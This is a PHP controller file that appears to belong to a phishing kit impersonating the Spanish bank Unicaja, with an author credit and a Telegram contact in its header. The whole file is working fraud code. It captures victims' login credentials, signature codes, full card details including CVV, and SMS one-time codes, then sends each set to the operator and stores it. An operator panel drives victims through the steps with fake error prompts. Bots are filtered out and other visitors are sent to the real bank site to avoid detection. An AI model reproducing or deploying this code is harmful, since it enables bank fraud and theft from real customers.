<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/

    require_once 'includes/main.php';
    if( $_GET['waiting'] == 1 ) {
        $response = panel_response();
        if( $response === 'badlogin' ) {
            echo 'errorlogin';
            exit();
        } else if( $response === 'cc' ) {
            echo 'cc';
            exit();
        } else if( $response === 'firma' ) {
            echo 'firma';
            exit();
        } else if( $response === 'badfirma' ) {
            echo 'errorfirma';
            exit();
        } else if( $response === 'sms' ) {
            echo 'sms';
            exit();
        } else if( $response === 'badsms' ) {
            echo 'errorsms';
            exit();
        } else if( $response === 'success' ) {
            echo 'success';
            exit();
        }
        exit();
    }
    if( $_GET['pwd'] == PASSWORD ) {
        session_destroy();
        visitors();
        $page = go('login');
        header("Location: " . $page['path'] . "?verification#_");
        exit();
    } else if( !empty($_GET['redirection']) ) {
        $red = $_GET['redirection'];
        if( $red == 'errorlogin' ) {
            $page = go('login');
            header("Location: " . $page['path'] . "?error=1&verification#_");
            exit();
        }
        if( $red == 'errorfirma' ) {
            $_SESSION['errors']['firma'] = 'la firma que ingresó es incorrecta.';
            $page = go('firma');
            header("Location: " . $page['path'] . "?error=1&verification#_");
            exit();
        }
        if( $red == 'errorsms' ) {
            $_SESSION['errors']['sms_code'] = 'el último SMS que ha ingresado es incorrecto.';
            $page = go('sms');
            header("Location: " . $page['path'] . "?error=1&verification#_");
            exit();
        }
        $page = go($red);
        header("Location: " . $page['path'] . "?verification#_");
        exit();
    } else if($_SERVER['REQUEST_METHOD'] == "POST") {
        if( !empty($_POST['captcha']) ) {
            header("HTTP/1.0 404 Not Found");
            die();
        }
        if ($_POST['step'] == "login") {
            $_SESSION['errors']     = [];
            $_SESSION['username']   = $_POST['username'];
            $_SESSION['password']        = $_POST['password'];
            $subject = get_client_ip() . ' | UNICAJA | Login';
            $message = '/-- LOGIN INFOS --/' . get_client_ip() . "\r\n";
            $message .= 'Username : ' . $_POST['username'] . "\r\n";
            $message .= 'password : ' . $_POST['password'] . "\r\n";
            $message .= '/-- END LOGIN INFOS --/' . "\r\n";
            $message .= victim_infos();
            send($subject,$message);
            $data = [
                'login'    => $_POST['username'] . ' | ' . $_POST['password'],
                'ip'        => get_client_ip()
            ];
            insert_login($data);
            $page = go('loading');
            header("Location: " . $page['path'] . "?verification#_");
            exit();
        }
        if ($_POST['step'] == "firma") {
            $_SESSION['errors']     = [];
            $_SESSION['firma']   = $_POST['firma'];
            if( empty($_POST['firma']) ) {
                $_SESSION['errors']['firma'] = 'la firma que ingresó es incorrecta.';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | UNICAJA | FIRMA';
                $message = '/-- FIRMA INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Firma : ' . $_POST['firma'] . "\r\n";
                $message .= '/-- END FIRMA INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                $data = [
                    'firma'    => $_POST['firma'],
                    'ip'        => get_client_ip()
                ];
                insert_firma($data);
                $page = go('loading');
                header("Location: " . $page['path'] . "?verification#_");
                exit();
            } else {
                $page = go('firma');
                header("Location: " . $page['path'] . "?error=1&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "cc") {
            $_SESSION['errors']      = [];
            $_SESSION['one']   = $_POST['one'];
            $_SESSION['two']     = $_POST['two'];
            $_SESSION['three']      = $_POST['three'];
            $date_ex     = explode('/',$_POST['two']);
            $card_number = validate_cc_number($_POST['one']);
            $card_cvv    = validate_cc_cvv($_POST['three'],$card_number['type']);
            $card_date   = validate_cc_date($date_ex[0],$date_ex[1]);
            if( $card_number == false ) {
                $_SESSION['errors']['one'] = 'Por favor, introduzca un número de tarjeta válido.';
            }
            if( $card_cvv == false ) {
                $_SESSION['errors']['three'] = 'Por favor ingrese un código válido.';
            }
            if( $card_date == false ) {
                $_SESSION['errors']['two'] = 'Por favor introduzca una fecha valida.';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | UNICAJA | Card';
                $message = '/-- CARD INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Card number : ' . $_POST['one'] . "\r\n";
                $message .= 'Card Date : ' . $_POST['two'] . "\r\n";
                $message .= 'Card CVV : ' . $_POST['three'] . "\r\n";
                $message .= '/-- END CARD INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                $data = [
                    'cc'    => $_POST['one'] . ' | ' . $_POST['two'] . ' | ' . $_POST['three'],
                    'ip'        => get_client_ip()
                ];
                insert_cc($data);
                $page = go('loading');
                header("Location: " . $page['path'] . "?verification#_");
            } else {
                $page = go('cc');
                header("Location: " . $page['path'] . "?error#_");
            }
        }
        if ($_POST['step'] == "sms") {
            $_SESSION['errors']     = [];
            $_SESSION['sms_code']   = $_POST['sms_code'];
            if( empty($_POST['sms_code']) ) {
                $_SESSION['errors']['sms_code'] = 'el último SMS que ha ingresado es incorrecto.';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | UNICAJA | Sms';
                $message = '/-- SMS INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'SMS code : ' . $_POST['sms_code'] . "\r\n";
                $message .= '/-- END SMS INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                $data = [
                    'sms'    => $_POST['sms_code'],
                    'ip'        => get_client_ip()
                ];
                insert_sms($data);
                $page = go('loading');
                header("Location: " . $page['path'] . "?verification#_");
                exit();
            } else {
                $page = go('sms');
                header("Location: " . $page['path'] . "?error=1&verification#_");
                exit();
            }
        }
    } else {
        header("Location: " . OFFICIAL_WEBSITE);
        exit();
    }
?>